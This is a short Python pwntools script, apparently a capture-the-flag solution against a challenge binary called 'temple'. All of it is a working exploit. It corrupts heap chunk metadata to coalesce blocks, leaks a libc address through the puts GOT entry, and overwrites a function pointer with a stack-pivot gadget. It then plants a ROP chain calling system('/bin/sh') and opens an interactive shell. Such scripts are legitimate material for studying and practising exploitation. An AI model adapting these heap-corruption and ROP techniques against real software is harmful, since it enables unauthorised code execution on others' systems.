import struct
import random
import string

from pwn import *
from pwnlib import util

from time import sleep

REMOTE = False

i = 0

if REMOTE:
  p = remote('inst-prof.ctfcompetition.com', 1337)
else:
  p = process('temple')

print "{}".format(p.pid)
 
def give_wisdom(n, buf):
    p.sendline('2')
    print p.recv()
    p.sendline(str(n))
    print p.recv()
    p.sendline(buf)
    print p.recv()

def rethink_wisdom(n, buf):
    p.sendline('3')
    print p.recv()
    p.sendline(str(n))
    print p.recv()
    p.sendline(buf)
    print p.recv()

def use_wisdom(n):
    p.sendline('1')
    print p.recv()
    p.sendline(str(n))
    return p.recv()

# Greeting
print p.recv()

# define a block such that n + 0x10 has 1 byte alignment (e.g. it is a multiple of 256)

n = 4336
payload = 'a'*(n-1) 

give_wisdom(n,  'a'*10)   #  8
give_wisdom(32, 'b'*10)   #  9
give_wisdom(32, 'c'*10)   # 10

# Free the footer of the large block
rethink_wisdom(8, payload)

# Free the block next to it so it will coalesce
use_wisdom(9)

give_wisdom(16, 'a')  # Allocate a block to leak libc        11
give_wisdom(16, 'b')  # Allocate a block to overwrite write  12
give_wisdom(256, 'z') # Allocate a block with our fake stack 13

rethink_wisdom(8, struct.pack('<Q', 8) + struct.pack('<Q', 0x00603018) + struct.pack('<Q', 23) + struct.pack('<Q', 0x00401c73) + struct.pack('<Q', 0x31) 
                 + struct.pack('<Q', 17)   + 'a'*16 + struct.pack('<Q', 17)
                 + struct.pack('<Q', 0x31) + struct.pack('<Q', 8) + struct.pack('<Q', 0x00603028) + struct.pack('<Q', 23) + struct.pack('<Q',  0x00401c73) + struct.pack('<I', 0x31))

# Leak the address to puts
data = use_wisdom(11)

libc_leak = struct.unpack('<Q', data[:8])[0]

puts = 0x0006f210

libc = libc_leak - 0x0006f210

print "libc: {:02x}".format(libc)
print data

binsh  = 0x0017af95
system = 0x00042010

# Make write do a stack pivot (xchg eax, esp; ret;)
rethink_wisdom(12, struct.pack('<Q', libc+0x0000000000084acd))

# Place our rop chain onto the heap (pop rdi; ret)
rethink_wisdom(13, struct.pack('<Q', libc+0x000000000002092f) + struct.pack('<Q', libc+binsh) + struct.pack('<Q', libc+system))

# Jump to our ROP chain 
p.sendline('1')
print p.recv()
p.sendline(str(13))

p.interactive()
